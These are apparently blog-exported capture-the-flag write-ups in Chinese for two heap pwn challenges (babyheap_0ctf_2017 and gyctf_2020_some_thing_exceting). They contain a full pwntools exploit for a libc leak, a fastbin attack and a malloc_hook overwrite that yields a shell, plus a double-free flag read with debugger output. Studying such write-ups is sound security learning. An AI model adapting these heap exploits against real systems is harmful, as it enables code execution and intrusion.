<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>主要的漏洞：任意长度堆溢出</p>
<ul>
<li><p>利用<strong>unsortedbin</strong>地址<strong>泄漏libc基地址</strong></p>
</li>
<li><p>利用<strong>fastbin attack</strong>将chunk分配到<strong>malloc_hook</strong>附近</p>
</li>
</ul>
<h4 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h4><blockquote>
<p>要利用unsortedbin泄漏，所以，要让两个块同时指向unsortedbin地址。</p>
<p>第一部分：</p>
<p>所以，一开始，首先将大小为0x80的块同时被认为是chunk2。方法是释放chunk2和chunk1，修改1的fd（原本指向chunk2），现在修改为chunk4，那么申请回来的时候chunk2实际是chunk4的内容。这里为了绕过检查，要让chunk4的大小为0x10。</p>
<p>接着，让chunk4的地址变回0x80，为了防止和top chunk合并，多申请一个chunk5，接着释放chunk4进入unsortedbin（chunk被释放后，如果大小不再fastbin内，会先放到unsortedbin中），chunk4里面的指针指向unsortedbin的链表头，用它可以计算出main_arena和libc的地址</p>
<p>第二部分：</p>
<p>因为malloc_hook附近有0x7f可用，找到一个合适的地方，申请堆块到这里，然后覆盖malloc_hook为one_gadget地址，再malloc任意值即可得到shell。</p>
</blockquote>
<h5 id="1-前期申请"><a href="#1-前期申请" class="headerlink" title="1.前期申请"></a>1.前期申请</h5><p>5个chunk</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#4</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;40gx 0x55b474ad1000</span><br><span class="line">0x55b474ad1000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55b474ad1010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b474ad1020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55b474ad1030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b474ad1040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55b474ad1050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b474ad1060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55b474ad1070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b474ad1080:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x55b474ad1090:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<h5 id="2-令另一个chunk分配到chunk4"><a href="#2-令另一个chunk分配到chunk4" class="headerlink" title="2.令另一个chunk分配到chunk4"></a>2.令另一个chunk分配到chunk4</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">free(2)</span><br><span class="line">free(1)</span><br></pre></td></tr></table></figure>
<p>链表：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fastbins</span><br><span class="line">0x20: 0x55a609172020(1) —▸ 0x55a609172040(2) ◂— 0x0</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE(1)</span><br><span class="line">Addr: 0x55a609172020</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x55a609172040</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE(2)</span><br><span class="line">Addr: 0x55a609172040</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x00</span><br></pre></td></tr></table></figure>
<p>本来chunk1是指向chunk2的，修改最低8位，（因为开了pie，但是最低3字节不变），这样chunk1就指向chunk4了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,len(payload),payload)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x556f686e7020(1) —▸ 0x556f686e7080(4) ◂— 0x0</span><br></pre></td></tr></table></figure>
<p><img src="/2020/11/11/02-45/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20201118235420360.png" alt="image-20201118235420360"></p>
<p>接着修改chunk4的大小，方便绕过检查</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,len(payload),payload)</span><br></pre></td></tr></table></figure>
<p>这样接着申请两个0x10的堆块时候，一个是原来的chunk1不变，chunk2变成了chunk4</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#2 -&gt; 4</span></span><br></pre></td></tr></table></figure>
<p>以后，使用chunk2，实际的操作在chunk4里面</p>
<h5 id="3-将chunk4放入到unsortbin中"><a href="#3-将chunk4放入到unsortbin中" class="headerlink" title="3.将chunk4放入到unsortbin中"></a>3.将chunk4放入到unsortbin中</h5><p>只要修改大小为0x80，然后释放掉即可。</p>
<p>这里为了防止与top chunk合并，所以在释放申请前，再申请一个chunk5</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
<p>现在，chunk2和chunk4指向相同的地址，而chunk4是unsortedbin中唯一的chunk，fd指针指向的是unsortedbin的链表，用chunk2就可以打印出它</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Content: \n"</span>)</span><br><span class="line">unsortedbin_addr = u64(p.recv(<span class="number">8</span>))</span><br></pre></td></tr></table></figure>
<p>由此计算出main_arena和libc基地址（0x58和0x3c4b20都是固定的libc-2.23.so）</p>
<p>main_arena_offset可以使用工具：<a href="https://github.com/Coldwave96/LibcOffset" target="_blank" rel="noopener">https://github.com/Coldwave96/LibcOffset</a></p>
<p><img src="/2020/11/11/02-45/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20201119001527081.png" alt="image-20201119001527081"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">main_arena = unsortedbin_addr - offset_unsortedbin_main_arena</span><br><span class="line">main_arena_offset = <span class="number">0x3c4b20</span></span><br><span class="line">libc_base = main_arena - main_arena_offset</span><br></pre></td></tr></table></figure>
<h5 id="4-伪造堆块"><a href="#4-伪造堆块" class="headerlink" title="4. 伪造堆块"></a>4. 伪造堆块</h5><p><img src="/2020/11/11/02-45/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20201119000157127.png" alt="image-20201119000157127"></p>
<p>main_arena上面就是malloc_hook，并且那些地址的开头都是0x7f，所以需要chunk块大小为0x60。</p>
<p>我们申请0x60的块即可，因为小于原来的0x80，会自动分割为两个：0x60和0x10（头，，），</p>
<p><img src="/2020/11/11/02-45/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20201119000539940.png" alt="image-20201119000539940"></p>
<p>有三个0x7f，但是第一个太近了，无法完全覆盖malloc_hook，第二个，前面没有7个0x00，不符合要求，所以是第三个，地址是<code>main_arena-0x33</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">fake_chunk_addr = main_arena - <span class="number">0x33</span></span><br><span class="line">fake_chunk = p64(fake_chunk_addr)</span><br><span class="line">fill(<span class="number">2</span>,len(fake_chunk),fake_chunk)</span><br></pre></td></tr></table></figure>
<h5 id="5-申请伪造的堆块"><a href="#5-申请伪造的堆块" class="headerlink" title="5.申请伪造的堆块"></a>5.申请伪造的堆块</h5><p>接着申请两个chunk</p>
<p>第一次申请的是chunk4，第二次申请的是chunk4的fd指针指向的地址，也就是我们伪造的堆块</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#6</span></span><br></pre></td></tr></table></figure>
<h5 id="6-在malloc的地址填入one-gadget"><a href="#6-在malloc的地址填入one-gadget" class="headerlink" title="6.在malloc的地址填入one_gadget"></a>6.在malloc的地址填入one_gadget</h5><p>one_gadget libc文件（本地在<code>/lib/x86_64-linux-gnu/libc-2.23.so</code>），有四个一个个试呗，第二个就行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x13</span> + p64(one_gadget)</span><br><span class="line">fill(<span class="number">6</span>,len(payload),payload)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure>
<h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</span><br><span class="line">p = process(<span class="string">"./babyheap_0ctf_2017"</span>)</span><br><span class="line"><span class="comment">#p = remote('node3.buuoj.cn',28082)</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.binary = <span class="string">"./babyheap_0ctf_2017"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">offset_bin_main_arena</span><span class="params">(idx)</span>:</span></span><br><span class="line">    word_bytes = context.word_size / <span class="number">8</span></span><br><span class="line">    offset = <span class="number">4</span>  <span class="comment"># lock</span></span><br><span class="line">    offset += <span class="number">4</span>  <span class="comment"># flags</span></span><br><span class="line">    offset += word_bytes * <span class="number">10</span>  <span class="comment"># offset fastbin</span></span><br><span class="line">    offset += word_bytes * <span class="number">2</span>  <span class="comment"># top,last_remainder</span></span><br><span class="line">    offset += idx * <span class="number">2</span> * word_bytes  <span class="comment"># idx</span></span><br><span class="line">    offset -= word_bytes * <span class="number">2</span>  <span class="comment"># bin overlap</span></span><br><span class="line">    <span class="keyword">return</span> offset</span><br><span class="line"></span><br><span class="line">offset_unsortedbin_main_arena = offset_bin_main_arena(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Command:"</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Size:"</span>)</span><br><span class="line">	p.sendline(str(size))	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Command:"</span>)</span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">	p.sendline(str(idx))	</span><br><span class="line">	p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">	p.sendline(str(size))	</span><br><span class="line">	p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">	p.sendline(str(content))	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Command:"</span>)</span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">	p.sendline(str(idx))	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Command:"</span>)</span><br><span class="line">	p.sendline(<span class="string">"4"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">	p.sendline(str(idx))		</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#2 -&gt; 4</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Content: \n"</span>)</span><br><span class="line">unsortedbin_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">main_arena = unsortedbin_addr - offset_unsortedbin_main_arena</span><br><span class="line">main_arena_offset = <span class="number">0x3c4b20</span></span><br><span class="line">libc_base = main_arena - main_arena_offset</span><br><span class="line">log.success(<span class="string">"[*]unsortedbin_addr:"</span>+hex(unsortedbin_addr))</span><br><span class="line">log.success(<span class="string">"[*]main_arena:"</span>+hex(main_arena))</span><br><span class="line">log.success(<span class="string">"[*]libc_base:"</span>+hex(libc_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">fake_chunk_addr = main_arena - <span class="number">0x33</span></span><br><span class="line">fake_chunk = p64(fake_chunk_addr)</span><br><span class="line">fill(<span class="number">2</span>,len(fake_chunk),fake_chunk)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x13</span> + p64(one_gadget)</span><br><span class="line">fill(<span class="number">6</span>,len(payload),payload)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>基础练习</tag>
      </tags>
  </entry>
  <entry>
    <title>gyctf_2020_some_thing_exceting详解</title>
    <url>/2021/05/01/21-48/</url>
    <content><![CDATA[<blockquote>
<p>还是高校战役的题，并且以前做过，，，，<del>但当时tcl，复现也不会，虽然现在也很菜</del></p>
<p>这里再重新写篇文章，记录下。</p>
</blockquote>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><p><img src="/2021/05/01/21-48/image-20210501212850010.png" alt="image-20210501212850010"></p>
<h4 id="init"><a href="#init" class="headerlink" title="init"></a>init</h4><p>程序最开始进入了init函数</p>
<blockquote>
<p>init函数首先将flag读入了内存。</p>
<p>接着又将内存flag的数据读入了s，在0x6020a8中。</p>
<p>由于0x6020a0处设置了0x60，可以将fake chunk申请到这里，再读取块数据，即可得到flag</p>
</blockquote>
<p><img src="/2021/05/01/21-48/image-20210501213125204.png" alt="image-20210501213125204"></p>
<h4 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h4><ol>
<li>create：创建一个指针chunk，里面存放了ba和na两个块的地址；创建ba和na，大小为0~0x70，fastbin大小内。</li>
<li>delete：free块，但是没有清零，可以double free，获得一定的地址读写能力</li>
<li>view：根据idx打印内容。</li>
</ol>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol>
<li>两次create</li>
<li>free(0) -&gt; free(1) -&gt; free(0)</li>
<li>重新申请create2，此时修改2的内容，由于0和2是同一个地址，修改2，修改了0的内容，重新申请4的时候，就可以申请到想要的地址</li>
<li>修改2的内容为0x6020a0-0x8</li>
<li>create3，create4</li>
<li>4即申请到了0x6020a0的位置，打印其内容即为flag</li>
</ol>
<h3 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h3><h4 id="0-保护"><a href="#0-保护" class="headerlink" title="0.保护"></a>0.保护</h4><blockquote>
<p>没开pie</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ checksec gyctf_2020_some_thing_exceting </span><br><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;gyctf_2020_some_thing_exceting&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h4 id="1-两次创建"><a href="#1-两次创建" class="headerlink" title="1.两次创建"></a>1.两次创建</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf74000</span><br><span class="line">Size: 0x231</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf74230</span><br><span class="line">Size: 0x1011</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf75240</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf75260</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf752c0</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf75320</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf75340</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf753a0</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0xf75400</span><br><span class="line">Size: 0x1fc01</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">create(<span class="number">0x50</span>,<span class="string">'aaaa'</span>,<span class="number">0x50</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">create(<span class="number">0x50</span>,<span class="string">'aaaa'</span>,<span class="number">0x50</span>,<span class="string">'bbbb'</span>)</span><br></pre></td></tr></table></figure>
<h4 id="2-double-free"><a href="#2-double-free" class="headerlink" title="2.double free"></a>2.double free</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x10ac000</span><br><span class="line">Size: 0x231</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x10ac230</span><br><span class="line">Size: 0x1011</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x10ad240</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x10ad320</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x10ad260</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x10ad2c0</span><br><span class="line">Size: 0x61</span><br><span class="line">fd: 0x10ad3a0</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x10ad320</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x10ad240</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x10ad340</span><br><span class="line">Size: 0x61</span><br><span class="line">fd: 0x10ad2c0</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x10ad3a0</span><br><span class="line">Size: 0x61</span><br><span class="line">fd: 0x10ad340</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x10ad400</span><br><span class="line">Size: 0x1fc01</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x10ad240 —▸ 0x10ad320 ◂— 0x10ad240</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x10ad2c0 —▸ 0x10ad3a0 —▸ 0x10ad340 ◂— 0x10ad2c0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<h4 id="3-create-3，并修改fd为fake-chunk"><a href="#3-create-3，并修改fd为fake-chunk" class="headerlink" title="3.create 3，并修改fd为fake chunk"></a>3.create 3，并修改fd为fake chunk</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xce5000</span><br><span class="line">Size: 0x231</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xce5230</span><br><span class="line">Size: 0x1011</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0xce6240</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0xce62d0</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xce6260</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0xce62c0</span><br><span class="line">Size: 0x61</span><br><span class="line">fd: 0x602098</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0xce6320</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0xce6240</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0xce6340</span><br><span class="line">Size: 0x61</span><br><span class="line">fd: 0xce62c0</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xce63a0</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0xce6400</span><br><span class="line">Size: 0x1fc01</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0xce6320 —▸ 0xce6240 —▸ 0xce62d0 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0xce6340 —▸ 0xce62c0 —▸ 0x602098 ◂— &#39;flag&#123;winter_excited&#125;&#39;</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fake_chunk &#x3D; 0x6020a0 - 0x8</span><br><span class="line">create(0x50,p64(fake_chunk),0x50,p64(fake_chunk))#2</span><br></pre></td></tr></table></figure>
<h4 id="4-create4，create5（申请到fake地址）"><a href="#4-create4，create5（申请到fake地址）" class="headerlink" title="4.create4，create5（申请到fake地址）"></a>4.create4，create5（申请到fake地址）</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x652000</span><br><span class="line">Size: 0x231</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x652230</span><br><span class="line">Size: 0x1011</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x653240</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x653260</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x6532c0</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x653320</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x653340</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x6533a0</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x653400</span><br><span class="line">Size: 0x81</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x653480</span><br><span class="line">Size: 0x1fb81</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x6532d0 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x6e69777b67616c66 (&#39;flag&#123;win&#39;)</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x6020a0-8</span><br><span class="line">0x602098:	0x0000000000000000	0x0000000000000060</span><br><span class="line">0x6020a8:	0x6e69777b67610a61	0x696378655f726574</span><br><span class="line">0x6020b8:	0x000000007d646574	0x0000000000000000</span><br></pre></td></tr></table></figure>
